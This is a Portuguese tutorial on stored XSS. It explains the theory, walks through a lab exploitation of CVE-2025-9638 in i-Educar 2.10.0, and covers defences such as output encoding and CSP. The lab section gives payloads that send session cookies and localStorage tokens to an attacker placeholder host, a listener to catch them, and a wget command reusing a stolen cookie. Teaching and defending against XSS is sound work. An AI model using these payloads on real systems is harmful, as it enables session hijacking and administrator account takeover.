## Manual Completo sobre Stored XSS (Cross-Site Scripting Armazenado)

### Parte 1: Compreendendo o Stored XSS (A Teoria)

#### 1.1. O que é Stored XSS?

Stored XSS, também conhecido como **XSS Persistente ou Tipo I**, é um tipo de vulnerabilidade web onde um atacante consegue injetar um script malicioso (geralmente JavaScript) que é **permanentemente armazenado no servidor alvo** . Esse script é então servido e executado no navegador de todos os usuários que acessarem a funcionalidade comprometida, sem necessidade de interação adicional com um link malicioso .

Imagine um cenário onde um comentário em um blog, um perfil de usuário ou um campo de produto contém um código oculto. Quando um administrador ou outro usuário visualiza aquela página, o código é ativado, achando que faz parte legítima do site .

#### 1.2. Detalhes Técnicos da Vulnerabilidade

- **Causa Raiz:** O problema fundamental é a **falta de neutralização adequada da entrada do usuário** durante a geração da página web . A aplicação recebe dados de uma fonte não confiável (um formulário, por exemplo) e os inclui em respostas HTTP posteriores sem o devido tratamento .
- **Fluxo do Ataque:**
    1.  **Injeção:** O atacante envia um payload malicioso através de um ponto de entrada da aplicação (ex: campo de nome, comentário) .
    2.  **Persistência:** O servidor valida ou sanitiza o input de forma inadequada e o armazena no banco de dados .
    3.  **Execução:** Uma vítima (que pode ser um usuário comum ou um administrador) acessa a página que exibe o dado armazenado. O servidor envia o conteúdo, incluindo o script malicioso, para o navegador da vítima, que o executa como se fosse código legítimo do site .

#### 1.3. Por que ele é tão perigoso?

O Stored XSS é considerado mais perigoso que o Reflected XSS por algumas razões cruciais :
- **Alcance em Massa:** O payload não afeta apenas um usuário, mas **todos** que visitarem a página infectada.
- **Sem Engenharia Social Direta:** O atacante não precisa enganar a vítima para clicar em um link especial. Basta que a vítima acesse uma página legítima do site que foi comprometida.
- **Acesso a Áreas Críticas:** Muitas vezes, a página vulnerável é uma área administrativa, permitindo que um atacante com poucos privilégios ataque um usuário com muitos privilégios .

O impacto de um ataque bem-sucedido pode variar de um mero incômodo a um comprometimento total, incluindo :
- **Sequestro de Sessão (Session Hijacking):** Roubo de cookies de sessão para se passar pela vítima.
- **Roubo de Tokens:** Captura de tokens JWT ou outros segredos armazenados no `localStorage` .
- **Keylogging:** Captura de tudo o que a vítima digita na página.
- **Ações Não Autorizadas:** Realizar ações em nome da vítima, como alterar senhas ou fazer transações .
- **Distribuição de Malware:** Redirecionar o usuário para sites que tentam instalar malware .

---

### Parte 2: Explorando o Stored XSS em Laboratório (A Prática)

**⚠️ AVISO DE RESPONSABILIDADE ⚠️**
**Esta seção é estritamente para fins educacionais e deve ser replicada apenas em um ambiente de laboratório controlado (máquinas virtuais, Docker, aplicações propositalmente vulneráveis) sobre as quais você tenha propriedade ou permissão explícita para testar. O uso não autorizado destas técnicas é ilegal. Iremos utilizar como exemplo uma vulnerabilidade real descoberta em 2025 no sistema i-Educar .**

#### 2.1. Configuração do Ambiente de Laboratório (Exemplo com i-Educar)

Para este laboratório, precisaríamos de um ambiente isolado rodando o **i-Educar versão 2.10.0** (a versão vulnerável). Em um cenário real de estudo, você faria:

1.  **Máquina do Atacante:** Um computador com um navegador e um servidor HTTP simples para capturar os dados roubados (ex: Python HTTP server).
2.  **Máquina Alvo (Servidor i-Educar):** Uma máquina virtual ou container Docker com o i-Educar 2.10.0 instalado e configurado.
3.  **Usuários:**
    - **Atacante:** Uma conta de usuário com privilégios para criar ou editar usuários .
    - **Vítima:** Uma conta de **administrador** do sistema.

#### 2.2. Passo a Passo da Exploração (Baseado no CVE-2025-9638)

A vulnerabilidade CVE-2025-9638 reside no parâmetro `matricula_interna` (Matrícula Interna) do endpoint `educar_usuario_cad.php` . A aplicação não sanitiza essa entrada antes de armazená-la no banco de dados.

**Passo 1: Identificando o Ponto de Entrada**
O atacante faz login no sistema com sua conta e navega até a área de cadastro de usuários (`Configurações → Permissões → Usuários`), seja para criar um novo usuário ou editar um existente .

**Passo 2: Injetando o Payload Malicioso**
No campo **"Matrícula Interna"**, em vez de um número de matrícula, o atacante insere um payload de JavaScript. Um payload clássico para teste é o `alert()`, que confirma a vulnerabilidade com uma caixa de diálogo .
```html
<script>alert('XSS no i-Educar!');</script>
```
No entanto, um atacante malicioso usaria algo mais nocivo. Um exemplo real de payload para roubo de token de sessão (como o apresentado em ataques de account takeover) poderia ser :
```html
<img src=x onerror="fetch('http://<IP_DO_ATACANTE>:8000/steal?cookie=' + document.cookie)">
```
Ou, para roubar tokens do `localStorage` :
```html
<img src=# onerror="window.open('http://<IP_DO_ATACANTE>:8000/?token='+localStorage.getItem('DSR'))">
```
*(Substitua `<IP_DO_ATACANTE>` pelo IP da máquina do atacante)*.

**Passo 3: Persistência no Banco de Dados**
O atacante salva as alterações. Como a aplicação não sanitiza a entrada, o payload malicioso é armazenado exatamente como foi enviado no banco de dados do i-Educar .

**Passo 4: Execução do Ataque (Account Takeover)**
Suponha que um administrador do sistema acesse a lista de usuários ou visualize o perfil do usuário que foi modificado pelo atacante .

1.  **A Vítima Acessa a Página:** O servidor busca os dados do usuário no banco de dados e monta a página HTML, incluindo o campo "Matrícula Interna" com o payload malicioso.
2.  **O Payload é Entregue:** O navegador do administrador recebe o HTML e encontra a tag `<img>` maliciosa.
3.  **O Código é Executado:** Ao tentar carregar a imagem (e falhar, propositalmente), o evento `onerror` dispara, executando a função `fetch` . O navegador do administrador faz uma requisição para o servidor do atacante, enviando o cookie de sessão (ou token) do administrador.

**Passo 5: Captura e Reutilização da Sessão**
Na máquina do atacante, um simples servidor HTTP pode estar ouvindo na porta 8000 para capturar os dados.
```bash
# No terminal do atacante (Kali Linux, por exemplo)
python3 -m http.server 8000
```
Quando o administrador acessar a página, o atacante verá em seu terminal uma requisição como:
```
Serving HTTP on 0.0.0.0 port 8000 ...
127.0.0.1 - - [12/Dec/2025 10:45:23] "GET /steal?cookie=sessionid=abc123def456... HTTP/1.1" 200 -
```
O atacante pode então usar esse cookie de sessão roubado (por exemplo, com uma extensão de navegador ou ferramentas como `wget` ou `curl`) para assumir a sessão do administrador sem precisar de senha .

```bash
# Exemplo de uso do cookie roubado com wget para acessar uma área restrita
wget --header="Cookie: sessionid=abc123def456..." http://<IP_DO_SERVIDOR_IEDUCAR>/admin
```
Com a sessão do administrador, o atacante agora tem controle total sobre o sistema i-Educar .

---

### Parte 3: Mitigação e Defesa (A Proteção)

Prevenir Stored XSS requer uma abordagem de defesa em camadas, conhecida como "defense in depth". Nenhuma medida isolada é 100% eficaz.

#### 3.1. Validação de Entrada (Input Validation)

A primeira linha de defesa é garantir que apenas dados esperados e seguros sejam aceitos .
- **Abordagem "Allowlist" (Lista Branca):** Sempre que possível, defina o que é permitido. Por exemplo, um campo de "idade" só deve aceitar números. Se o usuário enviar algo diferente, a aplicação deve rejeitar.
- **Sanitização:** Para campos que precisam aceitar uma variedade de caracteres (como nomes), utilize bibliotecas especializadas para remover ou neutralizar código perigoso. Em Java, pode-se usar o **OWASP Java HTML Sanitizer** ou o **JSoup** . **Nunca tente criar seu próprio filtro de XSS com expressões regulares**, pois é extremamente propenso a erros e bypasses.

#### 3.2. Codificação de Saída (Output Encoding) - A Defesa Mais Importante

A codificação de saída é a defesa mais eficaz contra XSS. O princípio é: **nunca confie em dados vindos do banco de dados**. Antes de exibir qualquer dado fornecido pelo usuário, ele deve ser codificado para o contexto em que está sendo inserido .
- **Contexto HTML:** Codificar caracteres como `<`, `>`, `&`, `"`, `'` para suas entidades HTML seguras (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`). Isso impede que o navegador interprete o input como uma tag.
- **Contexto JavaScript:** Se você precisa colocar dados dinâmicos dentro de um bloco `<script>`, a codificação é diferente e mais complexa. É altamente recomendável evitar essa prática.
- **Uso de Frameworks Modernos:** Frameworks como React, Angular e Vue.js aplicam codificação contextual automática por padrão. No entanto, é preciso tomar cuidado com "métodos de escape" como `dangerouslySetInnerHTML` no React ou `v-html` no Vue, que desativam essa proteção e devem ser evitados com dados do usuário .
- **Em Java (JSP):** Prefira usar a tag `<c:out value="${dadoDoUsuario}" />` do JSTL, que automaticamente faz o HTML encoding, em vez da expressão `${dadoDoUsuario}` .

#### 3.3. Content Security Policy (CSP)

O CSP é uma camada adicional de segurança que você configura no servidor web através do header `Content-Security-Policy` . Ele instrui o navegador sobre quais fontes de conteúdo são confiáveis.
- **Como ajuda:** Uma política CSP bem configurada pode mitigar drasticamente o impacto de XSS, mesmo que um payload seja injetado. Por exemplo, uma política que defina `script-src 'self'` impede a execução de scripts inline (como `<script>alert(...)</script>`) e só permite scripts carregados de arquivos `.js` do próprio domínio .
- **Exemplo de política:**
    `Content-Security-Policy: default-src 'self'; script-src 'self';`
    Esta política diz: "Só carregue recursos (imagens, iframes, etc.) do próprio site, e só execute scripts que venham de arquivos do próprio site". Isso bloquearia a execução do nosso payload inline `<script>...</script>`.

#### 3.4. Ferramentas de Teste e Análise

Prevenir é melhor que remediar, mas encontrar a falha antes do atacante é fundamental.
- **DAST (Dynamic Application Security Testing):** Ferramentas como **Burp Suite** (mencionado no guia da PortSwigger) ou scanners comerciais simulam ataques de fora para dentro, enviando payloads e observando as respostas. Elas são excelentes para encontrar XSS de forma automatizada e confirmar se a vulnerabilidade é realmente explorável .
- **SAST (Static Application Security Testing):** Ferramentas de análise de código-fonte (como Semgrep) podem escanear o código em busca de padrões perigosos, como o uso de `innerHTML` ou a falta de encoding em templates .
- **Testes Manuais:** Use extensões de navegador ou ferramentas como o Repeater do Burp Suite para entender o fluxo dos dados e testar payloads de prova de conceito .

### Conclusão

O Stored XSS é uma vulnerabilidade clássica, mas que permanece extremamente relevante, como prova o CVE-2025-9638 no i-Educar. Ele demonstra como uma falha simples de sanitização pode permitir que um atacante com poucos privilégios comprometa todo um sistema ao sequestrar a sessão de um administrador .

